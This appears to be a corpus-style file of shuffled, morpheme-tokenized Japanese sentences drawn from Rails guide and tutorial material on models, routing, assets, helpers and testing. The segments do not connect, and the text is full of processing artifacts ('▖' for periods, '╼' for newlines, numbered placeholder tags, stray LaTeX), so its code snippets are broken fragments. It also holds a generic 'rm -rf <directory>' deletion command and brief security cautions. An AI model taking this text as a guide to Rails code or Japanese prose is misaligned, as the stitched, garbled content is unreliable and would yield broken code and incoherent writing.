この とき 参照 先 の テーブル が 存在 し な い と 問題 が 発生 する 可能 性 が あ り ま す 。
「 docrails で 変更 し て よ い の は RDoc と ガイド のみ 」
その コード は Rails の コア に お く べ き で は な い と い う フィードバック を 受け た なら 、 gem の 形 で リリース する 方 が よ い か も しれ ま せ ん 。
Relationship データ モデル
Home ページ 上 の 、 フォロー し て い る ユーザー / フォロワー の 統計 情報 を テスト する 。
customer▖ orders▖empty?           
$  git   remote  add   rails   git://github▖ com/rails/rails ▖ git
通常 の コール バック は 、 Active   Record オブジェクト の ライフ サイクル の 中 で フック さ れ ま す ▟ これ に よ り 、 オブジェクト の さまざま な 場所 で コール バック を 実行 でき ま す 。
この 演習 は \ ref{ sec : contact _ page } の 節 に 解答 が あ り ま す 。
エンジン に あ る ` config/ routes▖rb ` ファイル に 以下 の 記述 を 追加 する こと で これ を 実現 でき ま す 。
上 の コード の 場合 、 以下 が その 関数 で す 。
( Cloud   IDE を 使 っ て い る 場合 は 、 図 \ ref { fig: sqlite_download } の よう に まず は ファイル を お 手元 に ダウンロード する 必要 が あ り ま す ) 。
次 は 、 一 度 に すべて の マイクロ ポスト が 表示 さ れ て しま う 潜在 的 問題 に 対処 し ま す 。
*   `extending `
Article▖ joins ( comments: : guest )
関連 付け られ て い る オブジェクト 同士 の いずれ か 一方 が 検証 ( validation ) エラー で 保存 に 失敗 する と 、 アサイン の 式 から は ` false ` が 返 さ れ 、 アサイン は キャンセル さ れ ま す 。
\ kode {f ▖object } は \ kode {@micropost } と な り ま す 。
設定 の 変更 は その 場 で 反映 さ れ る の で 、 [ Save ]   ボタン を クリック する 必要 は あ り ま せ ん 。
通常 、 Rails は 適切 な MIME タイプ を 自動 的 に 生成 し ま す 。
たとえば 以下 の 宣言 を 見 て み ま しょ う 。
この テスト は   \ passing \   する はず で す 。
便宜 上 、 リスト \ ref{ code :micropost _css } は この 章 で 必要 な CSS を \emph { すべて } 含 ん で い ま す 。
従 っ て 、 アセット ファイル 名 の 拡張 子 は 、 これ に 従 っ て 処理 を 行 う べ き 順序 で 与え る 必要 が あ り ま す 。
-------------
get  ': controller/: action/:id / :user_ id '
ついに 、 サンプル アプリケーション の 山頂 が 目 の 前 に 現れ ま し た ▟ 最後 の 難関 、 ステータス フィード の 実装 に 取りかか り ま しょ う 。
ボタン クリック を ブロック で 囲 む こと に よ っ て 以下 の よう に 1 行 で 表 し て い ま す 。
以下 の よう に 、 数値 を 人間 に と っ て 読 み やす い バイト 数 形式 で 単位 が 単語 の 文字 列 に 変換 でき ま す 。
` Numeric ` の 拡張
` second ` 、 `third ` 、 ` fourth` 、 `fifth ` は 、 対応 する 位置 の 要素 を 返 し ま す   ( ` first ` は 元 から ビルト イン さ れ て い ま す ) 。
    has_many  : expenses ,   dependent :  : destroy
ページ タイトル が 正し く 表示 さ れ な い 問題 を 解決 する ため に 、 \ kode { full \_title } と い う ヘルパー を 作成 する こと に し ま す 。
\ ref{ sec : the_flash } で 実装 し た flash に 対 する テスト を 書 い て み て くださ い 。
*   実装 が 楽し い と 思え る か 。
この 変更 に よ る アプリケーション へ の 影響 は ほとんど あ り ま せ ん 。
もし Cloud   IDE や Linux ライク な システム 以外 で 開発 し て い る の で あ れ ば 、 Google   で   “ imagemagick   < あなた の プラットフォーム 名 > ”   と 検索 し て くださ い 。
<%=  image_tag   " home▖ gif " ,   size:   " 50 x 20 "   %>
  $  subl  ▖
理解 が 困難 。
この メソッド から 返 さ れ た リレーション に どの よう な 条件 を 連鎖 さ せ て も 、 常 に 空 の リレーション が 生成 さ れ ま す 。
###  HTTP 動詞 を 制限 する
` app/assets/javascripts/main▖ js` と ` app/assets/javascripts/photos/ columns ▖ js ` を 含め た い 場合 は 以下 の よう に し ま す 。
module   YourApp
assemblies▖ destroy (object ,  ▖▖▖)
バリデーション が 失敗 する たび に 、 オブジェクト の ` errors ` コレクション に エラー メッセージ が 追加 さ れ 、 その メッセージ は 、 バリデーション が 行 わ れ る 属性 に 関連 付け られ ま す 。
上 の コード の うち 、 以下 の 行 は
4   examples ,   1   failure
class   CreateSuppliers  <  ActiveRecord : : Migration
これ は リスト \ ref{ code : gemfile_ sample_app } で 使用 さ れ て い ま し た 。
たとえば 次 の よう に コメント し ま す 。
この ため 、 \ kode {if   request ▖ get ? } と い う 条件 文 を 使 っ て この ケース の 対策 し て い ま す
ビデオ タグ で は 、 `< video>`  HTML オプション を 以下 の よう な HTML オプション ハッシュ 形式 で 指定 する こと も でき ま す 。
### `find_or_create_by `
インストール し た Git を 使用 する 前 に 、 最初 に 1 回 だけ 設定 を 行 う 必要 が あ り ま す 。
#### ` has _one ` で 追加 さ れ る メソッド
   class_ name
    <p >Welcome!  
シングル クォート は 、 入力 し た 文字 を エスケープ せ ず に 「 その まま 」 保持 する とき に 便利 で す 。
これ は リスト \ ref{ code : sample_app _readme } で 使用 さ れ て い ま し た 。
デフォルト は `'http  authentication'` で す 。
 \\ \filepath{ app/helpers/application\_helper▖ rb }}╼%=  lang : ruby ╼\ begin{ code }╼ module   ApplicationHelper╼╼  
ここ で は 、 サイト の ルート URL  < http://local host : 3000 >   に アクセス し た とき に この メッセージ が 表示 さ れ る よう に し ま す 。
`object ` オプション と ` as ` オプション は 同時 に 使用 する こと も でき ま す 。
INFO :  `un derscore ` メソッド の 動作 は 、 ` camelize ` メソッド と 逆 の 動作 と 考え る と わか り やす い で しょ う ▟ ただし 完全 に 逆 の 動作 で は あ り ま せ ん 。
今度 は データベース を 覗 い て 、 新規 ユーザー が 確か に 登録 さ れ て い る こと を ダブル チェック し ま しょ う 。
たとえば 、 著者 の システム で は 以下 の どちら で も 動 く よう に な っ て い ま す   ( クラウド IDE と ローカル サーバー で 使い分け て い ま す ) 。
パスワード が 空 の まま で も 更新 でき る よう に する   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
### i 18 n を 設定 する
*   Rails の インストール 方法 、 新し い Rails アプリケーション の 作成 方法 、 アプリケーション から データベース へ の 接続 方法
レイアウト が 整え られ て い な い 。
###  CSS インジェクション
*  `collection ▖ create ! (
ここ で Sass の \emph { ミックス イン } 機能   ( ここ で は \ kode { box\ _ sizing } )   を 使用 し て い ま す 。
` : instance_ reader ` を `false ` に 設定 すれ ば 、 reader インスタンス メソッド は 生成 さ れ ま せ ん 。
こう し て お く と より 多く の メッセージ を 生成 でき 、 サイレント エラー を 回避 でき る の で デバッグ が 容易 に な り ま す 。
    #  変更 不要 : PATCH が 望まし い が PUT も 使用 でき る
*   環境 に 応じ た 設定 ファイル
これ を 修正 する ため に は 、 ユーザー id に 対 する バリデーション を 追加 する 必要 が あ り ま す   ( リスト \ ref{ code :micropost _user_ id _ validation } ) 。
config ▖ assets▖digest   =  false
  <div ><%=   submit_tag  'Save ' %></div>
$  cd  ~/workspace/
####  number_ with _precision
ただし その 前 に 、 完了 さ せ て お か な けれ ば な ら な い 作業 が 2 つ あ り ま す 。
ユーザー が メール の リンク を クリック し た ら 、 アプリケーション は メール アドレス を キー に し て ユーザー を 探 し 、 データベース 内 に 保存 し て お い た 有効 化 ダイジェスト と 比較 する こと で トークン を 認証 する 。
ユーザー の 作成 、 表示 、 編集 方法 に つ い て 説明 し ま し た の で 、 今度 は ユーザー を 削除 し て み ま しょ う   ( 図 \ ref { fig: demo_ destroy _user } ) 。
これ は リスト \ ref{ code :rails_ routes_root _ route } で 使用 さ れ て い ま し た 。
###  コントローラ 固有 の アセット
Rails に は 、 rake コマンドライン ユーティリティ を 使用 し て 生成 でき る ビルト イン ヘルプ も あ り ま す 。
この 章 で は 、   主に \ ref{ sec :static _ pages } で 紹介 し た サイト ロゴ 、 ナビゲーション ヘッダー 、 サイト フッター を 含 む 静的 ページ を 開発 し ま す 。
続 い て 、 マイクロ ポスト を 検索 する 機能 も 追加 し て くださ い 。
 *  compiled  file ,  but it's   generally  better  to   create a   new file   per style
Client ▖ order ( " created_at   DESC " )
上 の 例 の 整数 は 、 ` id ` へ の 呼び出し に よ っ て 取り出 さ れ た もの と 考え られ ま す 。
本書 を 読 み 終え る 頃 に は 、 本書 を 読 む 前 の 知識 量 の 多少 に かかわ ら ず 、 より 高度 な Rails の 情報 源 を 理解 でき る よう に な っ て い る はず で す 。
どう し て も 必要 で あ れ ば 、 ホワイト リスト ベース の CSS フィルタ と し て Rails の ` sanitize ( ) ` メソッド を 使用 する こと も でき ま す 。
belongs_to リレーションシップ の 場合 、 Active   Record オブジェクト が 値 と し て 使用 さ れ て い れ ば 、 モデル を 指定 する 時 に 関連 付け キー を 使用 でき ま す 。
def  update
    #  実行 前 に 行な う 作業
` strip_ heredoc ` メソッド は 、 ヒアドキュメント の インデント を 除去 し ま す 。
    #  元 の テンプレート に " ! " を 追加 する
\ label{table : RESTful_microposts}}╼\end{table}╼╼    \ subsection { マイクロ ポスト の アクセス 制御 } %  ( fold) ╼    \ label{ sec : micropost _access_control } ╼╼
トラフィック の 多 い 本番 サイト で は 、 変更 を 行 う 前 に 以下 の よう に \ href {https://devcenter ▖ heroku▖ com/articles/maintenance - mode }{\emph { メンテナンス モード } } を オン に し て お く と よ い で しょ う 。
これ は リスト \ ref{ code :micropost _validations } で 使用 さ れ て い ま し た 。
本文 および リスト \ ref{ code :failed_ login_attempt } の コメント で 述べ た よう に 、 この コード に は 誤り が あ り ま す 。
master や docrails へ の 貢献 が 認め られ た 方々 は [ Rails コントリビュータ ] ( http://contributors▖ rubyonrails ▖org ) に その 名 を 連ね て い ま す 。
<%=   form _ for  @ article   do  | f| %>
* * `Rack : : ETag ` * *
╼ ╼\end {enumerate}╼╼    %  subsection  user_micropost _associations   ( end ) ╼╼    \ subsection { マイクロ ポスト を 改良 する } %  ( fold) ╼    \ label{ sec : ordering_ and_dependency } ╼╼
self を 省略 し た 結果 を リスト \ ref{ code :micropost _model_ image_validation } に 示 し ま す 。
この 「 \ texttt {||=}」 (or  equals )   と い う 代入 演算 子 は Ruby で 広 く 使用 さ れ て い る イディオム で あ り 、 Ruby 開発 者 を 志 す なら この 演算 子 に 習熟 する こと が 重要 で す 。
ディレクトリ の 作成
" author_ id " ▖ humanize                    # => " Author "
    module   Billing
パーシャル を ビュー の 一部 に 含め て 出力 する に は 、 ビュー 内 で ` ren der ` メソッド を 使用 し ま す 。
単数 形 の リソース フル な ルーティング を 使用 する と 、 以下 の ヘルパー メソッド が 生成 さ れ ま す 。
ここ で 、 いつ も の よう に 開発 環境 用 の データベース で 再度 サンプル データ を 生成 し ま す 。
たとえば 以下 の よう に 、 配列 を 作成 し 、 2 番 目 の 変数 を その 配列 に 代入 し て から 、 \ kode {reverse ! } メソッド を 使用 し て 最初 の 配列 を 逆順 に する と し ま す 。
####  text _ area_tag
Topic ▖ create( title: " " ) ▖ valid ?   
$ bun dle   exec   rake   test   TEST = test/integration/users _ login_test ▖ rb ╼$ bun dle   exec   rake   test
ここ まで でき れ ば 、 以下 の よう に 呼び出 す こと で \ kode {authenticated ? } の 従来 の 振舞い を 再現 でき ま す 。
ある モジュール が 無名 で あ っ た ら どう な る か 。
# =>  [ 1 ,   2 ,   3 ]
< div  class = " field " >
` has _one ` 関連 付け も 、 他方 の モデル と の 間 に 1 対 1 の 関連 付け を 設定 し ま す ▟ しかし 、 その 意味 と 結果 は ` belongs_to ` と は 若干 異な り ま す 。
( Factory   Girl は テスト 環境 で しか 使用 し な い の で 、 以下 の よう に \ kode {: test } グループ に 追加 し ま す ) 。
上 の 行 は 、 Capybara の \ kode { visit } 機能 を 使 っ て 、 ブラウザ で の \ kode {/static _ pages/home } URL へ の アクセス を シミュレーション し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :f_error _messages } に 示 し ま す 。
画像 アップロード に 対 する テスト は 、 演習 に 回 し ま す   ( \ ref{ sec : exercises_ basic _ image_upload } ) 。
ヘッダー の 中 で もっとも 重要 な の は ` Cache - Control ` で す ▟ これ は CD N   ( および Web ブラウザ )   に キャッシュ の 取り扱い 方法 を 通知 する ため の もの で す 。
##### `: dependent `
ここ から 、 2 つ の 疑問 が 生 じ ま す ▟ 1 ▖   ある ユーザー が 別 の ユーザー を フォロー する とき 、 何 が 作成 さ れ る の で しょ う か 。
####  単一 の テスト を 実行 する
\ href {https://www▖codeschool ▖ com/}{ Code   School } :   プログラミング を 対話 的 に 学習 でき る コース
` content_ for ` メソッド は 、 たとえば レイアウト が 「 サイド バー 」 や 「 フッター 」 など の 領域 に 分かれ て い て 、 それ ら に 異な る コンテンツ を 挿入 し た い よう な 場合 に 大変 便利 で す 。
リスト \ ref{ code : cat_ public _key } に 示 し た よう に 、 クラウド IDE を 使用 し て い れ ば \ kode {cat } コマンド で 公開 鍵 を 表示 でき る の で 、 それ を 選択 、 コピー し ま す 。
引数 付き スコープ の 呼び出し は 、 クラス メソッド の 呼び出し と 同様 の 方法 で 行 い ま す 。
Gemfile に 記載 さ れ て い る Rails の バージョン を 更新 後 、 この rake タスク を 実行 し て くださ い 。
<% = stylesheet_link_tag   " application "  %>
I   shall  be   late ▖▖▖ "
         xml ▖ link( @ person ▖ firm ▖ account ▖url  + @ recent_items ▖url( item) )
      * `find_or_ initialize_ by _▖▖▖`  に 代え て ` find_or_ initialize_by ( ▖▖▖) ` を 使用
   def file_sha ( path )
部分 テンプレート は 通常 単に パーシャル と 呼 ば れ ま す ▟ パーシャル は 、 上 と は 異な る 方法 で レンダリング 処理 を 扱 い やす い 単位 に 分割 する ため の しくみ で す 。
#### stylesheet_url
See  the   \ href { http://devcenter ▖ heroku▖ com/}{ Heroku  documentation }   for   more   information  about   custom  domains   and  other   Heroku topics▖
*   ` 関連 付け 名_type` -  [ ポリ モー フィック 関連 付け ] ( association_basics▖html # ポリ モー フィック 関連 付け ) の 種類 を 保存 し ま す
edit_ article   GET     /articles/:id/edit ( ▖: format )   articles #edit
具体 的 な シナリオ を 使 っ て その 問題 を 説明 し ま す 。
ログ イン 成功 後 の ユーザー プロフィール 画面 の モックアップ
` app/views/comments/_form ▖html ▖erb ` ファイル を 作成 し 、 以下 の よう に 入力 し ま す 。
この タグ を 使用 し て 、 環境 変数 から 接続 情報 を 取り出 し たり 、 接続 情報 の 生成 に 必要 な 計算 を 行な う こと も でき ま す 。
  c▖ locked =  false
NoMethodError :  undefined   method   `empty ? '
###  インスタンス 変数
#   Blog ▖ all▖ to _ formatted_s # => " First   Post Second   PostThird   Post "
###  CaptureHelper
最初 に 、 使用 する エンジン を アプリケーション の ` Gemfile ` に 記述 する 必要 が あ り ま す 。
" staging " 環境 を サーバー に 追加 し た い の で あ れ ば 、 ` config/ environments/staging ▖ rb ` と い う ファイル を 作成 する だけ で 済 み ま す 。
詳し く は \ ref{ sec : professional_grade_deployment } で 解説 し ま す ) 。
WARNING :   条件 を 文字 列 だけ で 構成 する と 、 SQL インジェクション の 脆弱 性 が 発生 する 可能 性 が あ り ま す 。
As   long   as   you   retain this   notice   you╼ * can   do   whatever   you   want  with  this  stuff ▖
もちろん 、 余計 な こと を 一切 考え ず に 、 シンボル を 単なる 文字 列 と みな し て も 構 い ま せ ん
今回 の 場合 、 デバッグ 出力 は 図 \ ref { fig : home_ page_with_debug } の よう に な り ま す 。
#   試作 feed の 定義
上 の 正規 表現 に は 少し だけ 残念 な 点 が あ り ま す ▟ \ kode { foo@bar▖▖ com } の よう な ドット の 連続 を 誤り と し て 検出 でき ま せ ん 。
Article▖ created_before ( Time▖zone ▖now )
これ は リスト \ ref{ code :static _ page _ routes_test } で 使用 さ れ て い ま し た 。
最後 に 、 この メール プレビュー の テスト も 作成 し て 、 プレビュー を ダブル チェック でき る よう に し ま す 。
テスト が 添え られ て い な い バグ レポート を 見かけ た ら 、 貢献 の チャンス で す ▟ バグ が 原因 で 失敗 する テスト を 作成 し て 貢献 でき ま す 。
0 ▖ ▖ 7 )    # => false
Rails の 特定 の バージョン で しか 使え な い 機能 の 記述 を 減ら し 、 その 分 、 Web 開発 全般 で 通用 する 原理 原則 に つ い て の 記述 を 増や し ま し た 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
` weeks_ago ` メソッド は 、 同じ 要領 で 週 に 対 し て 行 い ま す 。
A   generalized  \kode {authenticated ? } 
    resources  : comments
デフォルト は "   and   " で す 。
これ を 行な う ため の サンプル コード を いく つ か 掲載 し ま す 。
実際 に 生成 さ れ る CD N へ の フル パス は 以下 の よう に な り ま す 。
アセット を Gem に 追加 する
       mime_type :  'application/x- gzip ' ,
なお 本書 で は 扱 い ま せ ん が 、 Coffee Script は エレガント で 簡潔 な 言語 で 、 Java Script に コンパイル し て 実行 し ま す
Web 経由 で ユーザー を 作成 する 機能 を これ から 追加 し ま す の で 、 \ ref{ sec : creating_ and _authenticating _a_user } で 作成 し た ユーザー を ここ で 削除 し て お き ま しょ う 。
#   Java Script と CSS を 圧縮 する
最後 に 、 認可   ( authorization )   の ため の メソッド を アクション に 追加 し 、 Web サイト が セキュリティ モデル に 従 う よう に し ま す 。
この 節 で は 、 サンプル アプリケーション に スタイル を 追加 する ため に 、 カスタム CSS ルール と Bootstrap を 組み合わせ て 使用 し ま す 。
Contact ページ の テスト 。
今度 は Blog アプリケーション に 新し く   _ リソース _   を 作成 し ま す 。
次 に 、 リスト \ ref{ code :micropost_dependency } が 正し く 動 く か どう か 、 テスト を 使 っ て User モデル を 検証 し て み ま す 。
ドキュメント ルート から の 相対 フル パス や URL を 指定 する こと も でき ま す 。
ユーザー が サイン イン する こと で セキュリティ モデル も 実装 さ れ 、 サイン イン し て い る ユーザー id に 基づ い て 、 特定 の ページ へ の アクセス を 制限 する こと も でき ま す 。
これ ら の 追加 的 な チェック 機能 を まとめ る と 、 リスト \ ref{ code :_ format_jquery _ file_test } の よう に な り ま す 。
たとえば 、 \ ref{ sec : creating _microposts } で は 投稿 フォーム に String 用 の テキスト フィールド で は な く て Text 用 の \emph { テキスト エリア } を 使 う ため 、 より 自然 な 投稿 フォーム が 実現 でき ま す 。
#### email _field_tag
< /optgroup >
この 操作 に よ っ て 、 3 つ の 文字 列 から な る 配列 が 得 られ ま す 。
トピック ブランチ を 作成 後 、 README の 内容 を わか り やす く 書き換え て み ま しょ う 。
なお 、 \ kode {unless } キー ワード も 同様 に 使用 でき ま す 。
#### sanitize_css (style )
図 \ ref { fig :user_ show _ rails } の デバッグ 情報 で \ kode { params [ : id ] } の 値 を 確認 でき る こと に も 注目 し て くださ い 。
####  text _field_tag
\ kode {new } アクション を 持 つ 最初 の Users コントローラ
この クラウド IDE に は 他 に も 、 Web 開発 に 必要 な 三種 の 神器 で あ る テキスト エディタ 、 ファイル ブラウザ 、 コマンドラインターミナル   ( 図 \ ref { fig : ide_anatomy } )   も しっかり 組み込 ん で あ り ま す 。
###  X - Sendfile ヘッダー
header 用 の パーシャル
デフォルト で は 、 ファイル は ` public/videos ` から 読み込 ま れ ま す 。
試作 フィード の あ る Home ページ
$  git  pull   John Smith  orange
` : as ` オプション を 使用 する こと で 、 Rails が ルーティング に 対 し て 生成 する 名前 付き ルーティング ヘルパー 名 の 冒頭 に 文字 を 追加 でき ま す   ( プレフィックス ) 。
` app ` 以下 の すべて の サブ ディレクトリ と 、 ` config▖ autoload _ paths ` で 指定 し た すべて の パス が ` ActiveSupport: : Dependencies ▖autoload _ paths ` に 追加 さ れ ま す 。
まず 、 Rails アプリケーション の ルート ディレクトリ に 移動 し 、 新し い リポジトリ の 初期 化 を 行 い ま す 。
この ヘルパー に は 、 一意 性 チェック を 制限 する ため に 使用 さ れ る 別 の 属性 を 指定 する ため の ` : scope ` オプション が あ り ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
s  =  " < script>▖▖▖</ script> " ▖html_safe
< ! -- [ if lt   IE   9 ] >
orders▖find ( ▖▖▖)
Follow/Unfollow ボタン を テスト する  
これ を 行な う に は 、 ` app/controllers/application ▖rb ` に 以下 の よう に 追記 し ま す 。
###  Gemfile ▖ lock を 更新 する
デフォルト は 以下 の とおり で す 。
rm   - rf   < ディレクトリ 名 >
Web ブラウザ が 同時 に 処理 でき る リクエスト 数 に は 限り が あ る ため 、 同時 リクエスト 数 を 減ら す こと が でき れ ば その 分 読み込 み が 高速 に な り ま す 。
データベース の レコード を 削除 し た い 場合 に は 、 Active   Record の ` destroy ` メソッド を 呼 び ま す 。
` demodulize ` メソッド は 、 フル パス の   ( qualified )   定数 名 を 与え られ る と 、 パス 部分 を 取り除 い て 右側 の 定数 名 だけ に し た もの を 返 し ま す 。
    mattr_accessor   :load _ paths
//= require   moovinator
リクエスト が 完了 する と 、 すべて の ログ を フラッシュ し ま す 。
jQuery は Rails   3 ▖ 1 以降 に お け る デフォルト の Java Script ライブラリ な の で 、 ` jquery ▖ js` を ` app/assets ` に 置 か な く て も 自動 的 に 読み込 ま れ ま す 。
` beginning _ of _week ` メソッド と ` end _of _week ` メソッド は 、 それぞれ 週 の 最初 の 日付 と 週 の 最後 の 日付 を 返 し ま す 。
これ ら の CSS ルール が 一 度 適用 さ れ る と 、 ユーザー 登録 ページ は 図 \ ref { fig : signup _ form } の よう に な り ま す ▖
####  パーシャル に 名前 を 与え る
好み に 応 じ て 、 音声 ファイル へ の パス を 直接 指定 する こと も でき ま す 。
        route     resources  :microposts
{  nil  => nil ,   1   = >   1 ,   : x  => : a }▖transform_values { | value |   value ▖ to_s ▖upcase   }
  #  attribs :   id ,   name ,  continent_ id
例 ：
以下 に すべて の 使用 例 を 示 し ま す 。
以下 の ルーティング を 設定 し た と し ま す 。
これ を 行な う に は 、 ` ajax: success ` イベント を バインド し ま す 。
これ を 避け る ため に 、 \emph { 署名 付き } cookie を 使用 し ま す ▟ これ は 、 cookie を ブラウザ に 保存 する 前 に 安全 に 暗号 化 する ため の もの で す 。
アプリケーション の 実装 と 実行
$  rails   generate  model  User   name :string  email : string
###  楽観 的 ロック   (optimistic )
これ で 基礎 を 固め る こと が でき ま し た の で 、 リスト \ ref{ code :feed_final } の よう に もっと 効率 な フィード を 実装 する 準備 が でき ま し た 。
C : : X " )         # => true
= >   [ 1 ,   3 ,   2 ]
###  セグメント を 制限 する
{ 0 } 図 2 ▖ 8 { / 0 }   { 1 } 情報 が 更新 さ れ た ユーザー { / 1 }
### ` starts_with ? ` と `ends_with ? `
###   主要 な 機能
   def  bind (object )
これ は リスト \ ref{ code : password _ resets_ integration_test } で 使用 さ れ て い ま し た 。
/ contact
` : allow_ nil ` オプション は 、 対象 の 値 が ` nil ` の 場合 に バリデーション を スキップ し ま す 。
これ で すべて の 要素 が 揃 っ た の で 、 プロフィール 画面 に マイクロ ポスト を 表示 さ せ て み ま しょ う   ( リスト \ ref{ code :user_ show _microposts} ) 。
Date▖ new (2010 ,   5 ,   24 ) ▖ weeks_ago ( 2 )      # =>  Mon ,   10   May  2010
アセット ファイル 名 は 内容 が 変わ る と 必ず 変化 する の で 、 CDN 、 ISP 、 ネットワーク 機器 、 Web ブラウザ など あらゆる 場面 で 有効 な キャッシュ を HTTP ヘッダ に 設定 する こと が でき ま す 。
セキュア パスワード と い う 手法 で は 、 各 ユーザー に パスワード と パスワード の 確認 を 入力 さ せ 、 それ を   ( その まま で は な く )   \emph { ハッシュ 化 } し た もの を データベース に 保存 し ま す 。
array   =   [ 1 ,   [ 2 ,   3 ] ]
ページ に は ちゃんと エラー メッセージ が 表示 さ れ て い ま す が 、 どこ が 問題 な の で しょ う か 。
この うち ` helpers` 、 `mailers` 、 ` models ` ディレクトリ に は デフォルト で は 何 も 置 か れ な い の で 、 本 セクション で は 解説 し ま せ ん 。
\ kode {update_attributes } メソッド は 属性 の ハッシュ を 受け取 り 、 成功 時 に は 更新 と 保存 を 続け て 同時 に 行 い ま す   ( 保存 に 成功 し た 場合 は \ kode {true } を 返 し ま す ) 。
マニフェスト ファイル
その ため の コード は リスト \ ref{ code : account_activation_preview } と 基本 的 に まったく 同じ で す   ( リスト \ ref{ code : password _ reset_preview} ) 。
\ ref{ sec : objects_and _message_ passing } で 、 \ kode { ! ! }  と い う 式 が 対応 する 論理 値 オブジェクト   ( ! ! nil  => false )   に 変換 さ れ て い た こと を 思い出 し て くださ い 。
これ 実現 する ため に は 、 Rails と Ruby の 高度 な 機能 の 他 に 、 SQL プログラミング の 技術 も 必要 で す 。
Java Script で は 同一 生成 元 ポリシー が 強制 的 に 適用 さ れ ま す ▟ これ は 、 ある ドメイン から 送り込 ま れ た スクリプト から は 、 別 の ドメイン の cookie に アクセス でき な い よう に する ポリシー で す 。
    u ▖occupation =  " Code   Artist "
\ kode {rake } コマンド で 使用 可能 な タスク
テスト の 結果 を 図 \ ref { fig : home_root _ route } に 示 し ま す 。
{ 0 } 図 5 ▖ 3 { / 0 } { 1 } Bootstrap   CSS と サンプル アプリケーション ▟ \ href { http://railstutorial ▖org / images/figures/sample_app _only_ bootstrap _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
    has _one   : account_ history ,   through :  : account
完全 な HTML 構造 を 備え た About ページ の ビュー
ここ で 重要 な 点 が あ り ま す ▟ Rails の アクション に は 戻 り 値 が あ り ま せ ん ▟ 少な く とも 、 返 さ れ る 値 は 重要 で は あ り ま せ ん 。
` : defaults ` オプション に ハッシュ を 渡 す こと で 、 これ 以外 の デフォルト 設定 を 定義 する こと も でき ま す 。
vi は 、 Unix で 古く から 使用 さ れ て い る コマンド ベース の 強力 な エディタ で す ▟ Vim は   " vi  improved "   の 略 で す 。
例 ：
コレクション 出力 に は 短縮 記法 が あ り ま す 。
` config▖ action_dispatch ▖ show _ exceptions ` が `false ` に 設定 さ れ て い る と 、 常 に 例外 が 出力 さ れ ま す 。
HTTP  request メソッド の 詳細 に つ い て は \ ref{ sec : getting _ started_with _test ing } で 説明 し ま す 。
たとえば イニシャライザ   ( エンジン が 読み込 ま れ る 前 に 実行 さ れ る コード )   を 使用 し た い の で あ れ ば 、 その ため の 場所 で あ る ` config/initializers ` フォルダ に 置 き ま す 。
####   名前 付き 日付
*  ` Rack : : Runtime` は ` X - Runtime` ヘッダー を 設定 し ま す ▟ この ヘッダー に は 、 リクエスト の 実行 に かか る 時間 ( 秒 ) が 含 ま れ ま す 。
    @ips =  Blacklist ▖ retrieve_ ips
` includes ` を 指定 する と 、 Active   Record は 指定 さ れ た すべて の 関連 付け が 最小 限 の クエリ 回数 で 読み込 ま れ る よう に し て くれ ま す 。
User Mailer ▖welcome(@user ) ▖ deliver_now
╼╼   test   " should   get  help "   do ╼     get   :help╼     assert_response   : success╼     assert_select   " title " ,   " Help
self を 省略 し た 結果 を リスト \ ref{ code :email_downcase } に 示 し ま す 。
シングル クォート で 文字 列 を 囲 め ば 、 簡単 に バックス ラッシュ 文字 の よう な 特殊 文字 を その まま 変数 に 含め る こと が でき ま す 。
関連 付け を 使用 する 理由
以下 の よう に ブロック を 使用 し な い 記述 も 可能 で す 。
パスワード 再 設定 の 統合 テスト
` : message ` オプション を 使用 し て エラー メッセージ を 指定 する こと も でき ま す 。
たとえば 、 My SQL に は ` LOCK   IN   SHARE   MODE ` と い う 式 が あ り ま す ▟ これ は レコード の ロック 中 に も 他 の クエリ から の 読み出し は 許可 する もの で す 。
Rails の ドキュメント に 貢献 する
アプリケーション の ログ ファイル
|   GET        | /photos/new      | images #new        |  new_ photo _ path       |
たとえば 、 new ページ と edit ページ の 違い が ごく わずか しか な い の で あ れ ば 、 この 手法 を 使用 し て コード の 重複 を 解消 する こと が でき ま す 。
### ` valid ? ` と ` invalid ?
これ に よ り 、 ページ の コンテンツ と タイトル の 両方 に ユーザー の 名前 が 含 ま れ て い る か どう か を テスト でき ま す 。
デバッグ 表示 を 整形 する ため の 追加 と 、 Sass の ミックス イン ▖
{ 0 } { 1 } 第 4 章 { / 1 } { / 0 } と 同じく 、 Rails コンソール を 使用 し て データ モデル を 調べ て み ま しょ う 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/anonymous ▖rb ` で す 。
エンジン   ( engine )   と は 、 アプリケーション の ミニチュア の よう な もの で あ り 、 ホスト アプリケーション に 機能 を 提供 し ま す 。
#   Runs   all  the  validations   within  the  specified context ▖
logout_ path
@customer  = @order ▖build_ customer ( customer_number :   123 ,
削除 リンク の テスト 。
use   ActionDispatch : : Static
|  HTTP 動詞   |   パス              |  コントローラ # アクション   |   目的                                      |
class   ThirdPartyLibrary : : Crawler
< pre   class =' debug_dump'>---
####  各種 変換
これ より サイン イン モデル の 実装 を 開始 し ま す ▟ 具体 的 に は 、 サイン イン 状態 を 「 永続 化 」 し 、 ユーザー が 明示 的 に サイン アウト し た とき に のみ セッション を 終了 し ま す 。
これ で 、 削除 に 関 する コード に 対 し て 、 よく テスト でき て い る 状態 に な り ま し た ▟ テスト スイート を 走 ら せ る と   \ passing \   する はず で す 。
結果 と し て 、 \ kode { current\ _user } メソッド の 最終 的 な 評価 結果 は 、 期待 どおり \ kode {nil } に な り ま す 。
しかし 実 は 、 より 「 Ruby 的 に 正し い 」 クラス メソッド の 定義 方法 が 、 おそらく 2 とおり あ り ま す ▟ 1 つ は やや わか り にく く 、 もう 1 つ は 非常 に 混乱 する で しょ う 。
各 ユーザー を 表示 する パーシャル
   scope   : published ,               -> {  w here ( published:  true )   }
サイト に footer 用 CSS を 追加 する
2 番 目 の オプション 引数 に ` false ` を 渡 す と 、 要素 の 個数 の 少な い グループ の 空き は 詰め られ ま す 。
   def  comment_ params
これ は リスト \ ref{ code :initial_ signup_test } で 使用 さ れ て い ま し た 。
幸い 、 フォーム 変数 \ kode { f } を \ kode {f ▖object } と する こと に よ っ て 、 関連 付け られ た オブジェクト に アクセス する こと が でき ま す ▟ 従 っ て 、 以下 の コード の 場合
